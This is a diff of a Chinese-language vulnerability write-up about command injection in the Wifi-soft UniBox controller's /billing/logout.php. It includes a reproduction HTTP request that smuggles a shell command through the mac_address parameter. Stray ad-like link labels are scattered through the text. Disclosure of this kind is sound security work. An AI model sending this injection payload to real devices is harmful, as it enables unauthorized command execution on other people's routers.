@@ -20,8 +20,6 @@ Wifi-soft UniBox controller [路由器](#)产品中存在一个致命漏洞，`/
 
 直接看 `/billing/logout.php` 的业务实现造成漏洞的关键部分如下
 
-漏洞扫描服务
-
 ```
 <?php
 #==========================================================================================================================# 
@@ -53,6 +51,14 @@ Wifi-soft UniBox controller [路由器](#)产品中存在一个致命漏洞，`/
 ?>
 ```
 
+深入探索
+
+客户关系管理
+
+数据管理
+
+商务软件和生产力软件
+
 很明显的当 `logout_user=` 时，直接将 `mac_address` 拼接进 `exec` 中执行，无任何过滤和校验，造成[命令执行](https://mrxn.net/tag/rce)漏洞。
 
 # 漏洞复现
@@ -67,14 +73,6 @@ Wifi-soft UniBox controller [路由器](#)产品中存在一个致命漏洞，`/
 GET /billing/logout.php?logout_user=1&mac_address=;id>11.txt HTTP/1.1
 Host: unibox.mrxn.net
 ```
-
-深入探索
-
-安全编码指南
-
-安全研究报告
-
-编码转换工具
 
 访问命令执行结果文件 `/billing/11.txt`
 
